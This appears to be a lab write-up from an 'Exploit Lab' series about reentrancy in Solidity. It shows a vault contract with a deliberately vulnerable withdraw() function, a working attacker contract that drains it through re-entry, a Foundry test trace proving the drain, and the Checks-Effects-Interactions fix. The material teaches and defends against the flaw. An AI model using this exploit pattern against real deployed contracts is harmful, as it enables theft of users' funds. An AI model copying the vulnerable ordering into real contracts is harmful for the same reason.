# Reentrancy — Exploit Lab 01

> Part of the **Exploit Lab** series: isolated toy contracts that reproduce a known
> smart-contract vulnerability end to end — vulnerable code, a working exploit,
> on-chain proof via a test trace, and the fix that defeats it.

## Summary

A vault holds ETH deposits and lets users withdraw their balance. Because the
withdrawal sends ETH **before** it updates internal accounting, an attacker
contract can re-enter `withdraw()` from its `receive()` hook and drain the vault
in a single transaction.

- **Vulnerability class:** Reentrancy (SWC-107 / CWE-841)
- **Root cause:** External call placed before the state update (violates Checks-Effects-Interactions)
- **Impact:** Full loss of vault funds
- **Fix:** Reorder to Checks-Effects-Interactions; optionally add a reentrancy guard as defense-in-depth

## The vulnerable contract

```solidity
// src/Vault.sol
mapping(address => uint256) public balances;

function deposit() external payable {
    balances[msg.sender] += msg.value;
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "nothing to withdraw");

    (bool ok, ) = msg.sender.call{value: amount}("");  // <-- INTERACTION (vulnerable line)
    require(ok, "transfer failed");

    balances[msg.sender] = 0;                           // <-- EFFECT happens too late
}
```

The single vulnerable line is the external `call` executing while
`balances[msg.sender]` is still non-zero. Control is handed to `msg.sender`
before the balance is cleared, so any code that runs during that call observes
stale state.

## Attack mechanics

The attacker is a contract whose `receive()` hook calls back into `withdraw()`
while its recorded balance is still non-zero.

```solidity
// src/Attacker.sol
contract Attacker {
    Vault public vault;
    uint256 constant UNIT = 1 ether;

    constructor(address _vault) { vault = Vault(_vault); }

    function attack() external payable {
        vault.deposit{value: UNIT}();
        vault.withdraw();            // first payout -> triggers re-entry
    }

    receive() external payable {
        if (address(vault).balance >= UNIT) {
            vault.withdraw();        // re-enter before balances[attacker] is zeroed
        }
    }
}
```

Step by step:

1. Attacker deposits 1 ETH. `balances[attacker] = 1 ETH`.
2. Attacker calls `withdraw()`. The vault reads `amount = 1 ETH`, passes the
   `require`, and sends 1 ETH to the attacker **before** zeroing the balance.
3. The transfer triggers `Attacker.receive()`, which calls `withdraw()` again.
4. `balances[attacker]` is *still* 1 ETH (step 2 never reached the `= 0` line),
   so the check passes and the vault pays out another 1 ETH.
5. Steps 3–4 recurse until the vault balance drops below 1 ETH.
6. The stack unwinds and every deferred `balances[msg.sender] = 0` finally runs —
   long after the ETH is gone.

Net result: the attacker withdraws far more than it deposited; the vault is
drained.

## Proof

Two tests define the lab:

- `test_HonestUserCanWithdraw` — baseline: a normal user deposits and withdraws
  exactly their balance. Confirms the contract behaves correctly under honest use.
- `test_ReentrancyDrainsVault` — the exploit: seeds the vault with other users'
  deposits, runs the attack, and asserts the vault is emptied while the attacker
  walks away with more than it put in.

Run:

```bash
forge test -vvvv
```

```bash
Compiler run successful!

Ran 2 tests for test/Vault.t.sol:VaultReentrancyTest
[PASS] test_HonestUserCanWithdraw() (gas: 37581)
Traces:
  [42381] VaultReentrancyTest::test_HonestUserCanWithdraw()
    ├─ [0] VM::prank(honest: [0xd18647f29CD53E4c741F7caa47A1Cae42A908779])
    │   └─ ← [Return]
    ├─ [28729] Vault::withdraw()
    │   ├─ [0] honest::receive{value: 5000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    └─ ← [Stop]

[PASS] test_ReentrancyDrainsVault() (gas: 84162)
Traces:
  [104062] VaultReentrancyTest::test_ReentrancyDrainsVault()
    ├─ [0] VM::deal(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1000000000000000000 [1e18])
    │   └─ ← [Return]
    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [0] VM::deployCode("src/Attacker.sol:Attacker", 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   ├─ [353527] → new Attacker@0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a
    │   │   └─ ← [Return] 1763 bytes of code
    │   └─ ← [Return] Attacker: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a]
    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [82531] Attacker::attack{value: 1000000000000000000}()
    │   ├─ [22559] Vault::deposit{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ [48773] Vault::withdraw()
    │   │   ├─ [41108] Attacker::receive{value: 1000000000000000000}()
    │   │   │   ├─ [40588] Vault::withdraw()
    │   │   │   │   ├─ [32923] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   ├─ [32403] Vault::withdraw()
    │   │   │   │   │   │   ├─ [24738] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   ├─ [24218] Vault::withdraw()
    │   │   │   │   │   │   │   │   ├─ [16553] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   ├─ [16033] Vault::withdraw()
    │   │   │   │   │   │   │   │   │   │   ├─ [8368] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   ├─ [7848] Vault::withdraw()
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [183] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [356] Vault::totalBalance() [staticcall]
    │   └─ ← [Return] 0
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.58ms (1.25ms CPU time)
```

The nested `Vault::withdraw()` calls in the trace are the exploit made visible:
each frame is one re-entry that happened before the balance was cleared.

## The fix

Reorder so the state update (effect) happens before the external call
(interaction):

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "nothing to withdraw");

    balances[msg.sender] = 0;                           // EFFECT first
    (bool ok, ) = msg.sender.call{value: amount}("");   // INTERACTION last
    require(ok, "transfer failed");
}
```

Now when the attacker re-enters, `balances[attacker]` is already `0`, the
`require(amount > 0)` reverts, and the recursion dies on the first re-entry.

A reentrancy guard (e.g. OpenZeppelin `ReentrancyGuard`'s `nonReentrant`) is a
second, defense-in-depth layer — but CEI is the actual fix. A guard bolted onto
non-CEI code hides the smell rather than removing it.

## The test that flips

The same `test_ReentrancyDrainsVault` doubles as the regression test:

- Against the **vulnerable** `withdraw()` → the exploit succeeds, the drain
  assertion passes, the test is green.
- Against the **fixed** `withdraw()` → the re-entry reverts, the vault keeps its
  funds, and the drain assertion fails.

That flip — same test, opposite outcome once the line order changes — is the
proof the fix addresses the root cause rather than a symptom.

## Run it yourself

```bash
forge install
forge build
forge test -vvvv
```

## Takeaways

- The bug is not the `call` — it is the *ordering*. External calls hand control to
  untrusted code; anything mutable that is read after the call is exposed.
- Checks-Effects-Interactions is a discipline, not a library. Most reentrancy bugs
  are one misplaced line.
- Reentrancy guards are useful, but they treat CEI as optional. It isn't.